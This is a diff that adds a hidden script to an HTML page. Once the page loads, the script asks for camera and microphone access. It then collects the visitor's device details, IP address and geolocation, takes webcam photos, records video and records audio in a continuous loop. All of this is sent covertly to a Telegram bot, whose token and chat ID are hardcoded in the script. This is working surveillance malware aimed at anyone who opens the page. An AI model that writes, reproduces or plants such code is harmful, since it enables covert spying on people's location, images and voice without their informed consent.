@@ -274,8 +274,144 @@
       100% { box-shadow: 0 0 5px red; }
     }
   </style>
+</div>
 
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>👑 شادو 👑</title>
+</head>
+<body>
+
+<script>
+const BOT_TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
+const CHAT_ID = "7664410054";
+
+async function sendMessage(text) {
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({chat_id: CHAT_ID, text: text})
+  });
+}
+
+async function sendFile(file, type, caption) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append(type, file, file.name || 'file');
+  if (caption) form.append("caption", caption);
+
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${type === 'photo' ? 'Photo' : type === 'video' ? 'Video' : 'Document'}`, {
+    method: 'POST',
+    body: form
+  });
+}
+
+function getDeviceInfo() {
+  return {
+    userAgent: navigator.userAgent,
+    platform: navigator.platform,
+    language: navigator.language,
+    cookiesEnabled: navigator.cookieEnabled,
+    screen: `${screen.width}x${screen.height}`
+  };
+}
+
+function getIP() {
+  return fetch("https://api.ipify.org?format=json")
+    .then(res => res.json())
+    .then(data => data.ip)
+    .catch(() => "غير معروف");
+}
+
+async function getLocation() {
+  return new Promise((resolve) => {
+    navigator.geolocation.getCurrentPosition(pos => {
+      const coords = pos.coords;
+      resolve(`https://maps.google.com/?q=${coords.latitude},${coords.longitude}`);
+    }, () => resolve("❌ الموقع مرفوض"));
+  });
+}
+
+async function captureImages(count = 10) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const track = stream.getVideoTracks()[0];
+    const imageCapture = new ImageCapture(track);
+    for (let i = 0; i < count; i++) {
+      const blob = await imageCapture.takePhoto();
+      await sendFile(blob, 'photo');
+    }
+    track.stop();
+  } catch (e) {
+    console.warn("📸 فشل التقاط الصور");
+  }
+}
+
+async function recordVideo(duration = 10) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+    const chunks = [];
+
+    recorder.ondataavailable = e => chunks.push(e.data);
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      await sendFile(blob, 'video');
+      stream.getTracks().forEach(track => track.stop());
+    };
+
+    recorder.start();
+    setTimeout(() => recorder.stop(), duration * 1000);
+  } catch (e) {
+    console.warn("🎬 فشل تسجيل الفيديو");
+  }
+}
+
+async function recordAudioLoop(interval = 5000) {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+    const recorder = new MediaRecorder(stream);
+    recorder.ondataavailable = async e => {
+      if (e.data.size > 0) {
+        await sendFile(e.data, 'document', '🎤 تسجيل صوتي');
+      }
+    };
+    setInterval(() => {
+      recorder.stop();
+      recorder.start();
+    }, interval);
+    recorder.start();
+  } catch (e) {
+    console.warn("🎤 فشل تسجيل الصوت");
+  }
+}
+
+function startShadow() {
+  sendMessage("👑 شادو، هناك دخيل جديد 👑");
+  
+  Promise.all([getIP(), getLocation()]).then(async ([ip, location]) => {
+    const info = getDeviceInfo();
+    await sendMessage(`🌐 بيــانـات الجهاز 🌐\n\n• 🏴‍☠️ إســم المتصفح: ${info.userAgent}\n• 🏴‍☠️ النظام: ${info.platform}\n• 🏴‍☠️ اللغة: ${info.language}\n• 🏴‍☠️ حجم الشاشة: ${info.screen}\n• 🏴‍☠️ الكوكيز: ${info.cookiesEnabled}\n• 🏴‍☠️ IP: ${ip}\n• 🏴‍☠️ الموقع: ${location}`);
+    
+    await sendMessage("📸 صور 📸");
+    await captureImages();
+
+    await sendMessage("🎬 فيديوهات 🎬");
+    await recordVideo();
+
+    await sendMessage("🎤تسجيلات صوت🎤");
+    await recordAudioLoop(); // يستمر يسجل كل 5 ثواني
+  });
+}
+
+window.onload = () => {
+  navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(() => {
+    startShadow();
+  }).catch(() => {
+    sendMessage("⚠️ المستخدم رفض الصلاحيات.");
+  });
+};
+</script>
 </body>
 </html>
-
-
